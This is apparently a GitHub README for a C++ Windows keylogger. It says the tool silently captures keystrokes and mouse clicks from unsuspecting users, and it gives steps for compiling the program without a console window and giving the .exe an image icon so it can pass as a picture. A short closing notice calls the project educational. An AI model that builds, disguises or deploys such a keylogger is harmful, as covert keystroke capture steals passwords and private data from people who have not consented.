# Key Logger

## Description
A C++ hacking tool designed to capture keystrokes from unsuspecting users. The application runs silently, disguised as an image file, and logs all keystrokes into a file for review. This project is an experiment in understanding how malicious software might function for ethical hacking purposes.

## Features
- Stealth operation with no visible console window.
- Packaged as a payload `.exe` disguised as an image.
- Logs keystrokes and mouse clicks to a text file.

## Prerequisites
- Windows operating system.
- MinGW or any other C++ compiler that supports Windows API.

## How to Compile and Run
Clone the Repository:
```
git clone https://github.com/Yaswanth-Mitta/KeyLogger.git
```


## Navigate to the Project Directory
```
cd KeyLogger
```

## Compile the Code: Make sure you have MinGW or any C++ compiler installed:

```
g++ keylogger.cpp resource.o -o keylogger.exe -mwindows
```
Here you can use the .exe file  to make it like disguised paylod proceed the following steps

# Creating like a Payload

1. Create a Resource Script (resource.rc): Create a file named resource.rc in the project directory with the following content:

```
1 ICON "luffy.ico"
```

2. Compile the Resource Script: Use windres to compile the resource script:

```
windres resource.rc -o resource.o
```

3. Link the Resource Object with the Executable: Update the compile command to include the resource object:
```
g++ -o KeyLogger.exe keylogger.cpp resource.o -luser32
```

## Ethical Notice
This tool is intended for educational purposes only. Never use a keylogger without proper consent, as doing so violates privacy rights and can have legal consequences. This project is to demonstrate potential security threats.